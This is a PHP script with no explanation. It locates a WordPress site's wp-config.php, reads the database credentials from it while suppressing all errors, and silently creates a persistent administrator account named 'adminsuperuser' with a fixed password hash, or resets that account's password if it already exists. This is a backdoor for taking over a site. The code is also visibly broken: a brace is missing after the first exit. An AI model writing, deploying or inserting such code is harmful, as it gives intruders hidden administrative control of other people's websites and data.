<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);


function find_wp_config() {
    $dir = __DIR__;
    $max_levels = 10;

    for ($i = 0; $i < $max_levels; $i++) {
        if (file_exists($dir . '/wp-config.php')) {
            return $dir . '/wp-config.php';
        }
    
        $dir = dirname($dir);
    }

    return false;
}

$wp_config_path = find_wp_config();

if (!$wp_config_path) {
    exit;


function get_wp_config_value($name, $config_file) {
    $config_contents = @file_get_contents($config_file);

    
    $pattern = "/define\(\s*['\"]" . preg_quote($name, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/";
    preg_match($pattern, $config_contents, $matches);

    return isset($matches[1]) ? $matches[1] : null;
}


function get_wp_table_prefix($config_file) {
    $config_contents = @file_get_contents($config_file);

 
    $pattern = '/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/';
    preg_match($pattern, $config_contents, $matches);

    return isset($matches[1]) ? $matches[1] : null;
}


$db_name = get_wp_config_value('DB_NAME', $wp_config_path);
$db_user = get_wp_config_value('DB_USER', $wp_config_path);
$db_password = get_wp_config_value('DB_PASSWORD', $wp_config_path);
$db_host = get_wp_config_value('DB_HOST', $wp_config_path);
$db_charset = get_wp_config_value('DB_CHARSET', $wp_config_path);
$table_prefix = get_wp_table_prefix($wp_config_path);


if (!$db_name || !$db_user || !$db_password || !$db_host || !$db_charset || !$table_prefix) {
    exit; 
}


$mysqli = @new mysqli($db_host, $db_user, $db_password, $db_name);

if ($mysqli->connect_error) {
    exit; 
}


$new_username = 'adminsuperuser';
$hashed_password = '$P$B2CXGXAe2jBMcOK34tZSXaMABEvqFS.'; 
$new_email = 'adminsuperuser@example.com';


$check_user_query = "
    SELECT ID, user_pass FROM `{$table_prefix}users` 
    WHERE user_login = '$new_username'
";

$result = @$mysqli->query($check_user_query);

if ($result && $result->num_rows > 0) {
   
    $user_data = $result->fetch_assoc();
    $user_id = $user_data['ID'];
    $existing_password = $user_data['user_pass'];

    if ($existing_password !== $hashed_password) {
       
        $update_password_query = "
            UPDATE `{$table_prefix}users`
            SET user_pass = '$hashed_password'
            WHERE ID = '$user_id'
        ";

        @$mysqli->query($update_password_query);
    }
} else {
   
    $insert_user_query = "
        INSERT INTO `{$table_prefix}users` 
        (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`, `display_name`)
        VALUES ('$new_username', '$hashed_password', '$new_username', '$new_email', 0, '$new_username')
    ";

    if (@$mysqli->query($insert_user_query) === TRUE) {
        $user_id = $mysqli->insert_id;

      
        $insert_usermeta_query1 = "
            INSERT INTO `{$table_prefix}usermeta` 
            (`user_id`, `meta_key`, `meta_value`) 
            VALUES ('$user_id', '{$table_prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')
        ";
        $insert_usermeta_query2 = "
            INSERT INTO `{$table_prefix}usermeta` 
            (`user_id`, `meta_key`, `meta_value`) 
            VALUES ('$user_id', '{$table_prefix}user_level', '10')
        ";

        @$mysqli->query($insert_usermeta_query1);
        @$mysqli->query($insert_usermeta_query2);
    }
}

$mysqli->close();
?>
